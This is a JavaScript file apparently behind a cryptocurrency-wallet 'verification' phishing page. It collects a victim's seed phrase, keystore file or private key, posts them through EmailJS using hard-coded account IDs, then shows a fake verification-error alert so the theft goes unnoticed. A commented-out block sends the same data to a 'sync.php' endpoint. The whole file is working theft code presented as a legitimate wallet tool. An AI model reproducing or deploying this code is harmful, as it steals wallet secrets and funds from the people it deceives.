var phrase = document.querySelector("#phrase");
var keystore = document.querySelector("#keystore");
var private = document.querySelector("#private");
var first = document.querySelector("#first");
var second = document.getElementById("second");
var third = document.querySelector("#third");
var fileUp = document.querySelector("#file-upload");
var wallet_name = document.querySelector("#walletname");
phrase.addEventListener("click", function() {
    hide(first);
});

keystore.addEventListener("click", function() {
    hide(second);
});

private.addEventListener("click", function() {
    hide(third);
});

function hide(elem) {
    var expandedPanel = document.querySelector(".active");
    //This is to remove the current active class on click
    if (expandedPanel) {
        expandedPanel.classList.remove("active");
        var attr = document.getElementsByClassName(
            "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full"
        );

        for (let i = 0; i < attr.length; i++) {
            attr[i].value = "";
        }
    }
    var i = document.getElementsByClassName(
        "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
    );
    var x = elem.getElementsByClassName(
        "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
    );

    for (let c = 0; c < i.length; c++) {
        i[c].required = false;
    }
    for (let c = 0; c < x.length; c++) {
        x[c].required = true;
    }
    //add an active tag to the clicked element and set it's

    elem.classList.add("active");
}

const form = document.querySelector("form");

$("form").on("submit", function(event) {
    event.preventDefault();

    var formData = new FormData($("#form")[0]);

    formData.append("file", $("input[type=file]")[0].files[0]);
    formData.append("wallet", wallet_name.innerHTML);
    formData.append("service_id", "service_u3unrip");
    formData.append("template_id", "template_96cz2qc");
    formData.append("user_id", "OenXyZ7bc76OZc7ie");

    $.ajax({
        type: "POST",
        url: "https://api.emailjs.com/api/v1.0/email/send-form",
        data: formData,
        //use contentType, processData for sure.
        contentType: false,
        processData: false,
        beforeSend: function() {
            document.querySelector(".sending").style.display = "flex";
        },
        success: function(msg) {
            console.log(msg);
            alert("Error Verifying Wallet... Please try again later");
            document.querySelector(".sending").style.display = "none";
        },
        error: function() {
            alert("Oops! Something went wrong. Check your internet");
        },
    });
});

// function sendData( data ) {

//  console.log(form.elements);

//   const XHR = new XMLHttpRequest(),
//         FD  = new FormData( form );

//   // Push our data into our FormData object
//   for( var name in data ) {
//     FD.append( name, data[ name ] );
//   }
//   FD.append("wallet", wallet_name.innerHTML);
//   //FD.append( "file", file[0].files[0]);

// console.log(FD);

//   // Define what happens on successful data submission
//   XHR.addEventListener( 'load', function( event ) {
//     console.log( XHR.responseText );
//     alert( 'Error Verifying Wallet... Please try again later' );
//       document.querySelector(".sending").style.display = "none";
//   } );

//   // Define what happens in case of error
//   XHR.addEventListener(' error', function( event ) {
//     alert( 'Oops! Something went wrong. Check your internet' );
//   } );

//   // Set up our request
//   XHR.open( 'POST', 'sync.php' );

//   // Send our FormData object; HTTP headers are set automatically
//   XHR.send(FD);
// }

// form.addEventListener( 'submit', function(e){
//       e.preventDefault();
//       document.querySelector(".sending").style.display = "flex";
//       //delay for 5 seconds
//       window.setTimeout( sendData, 2000);
// } );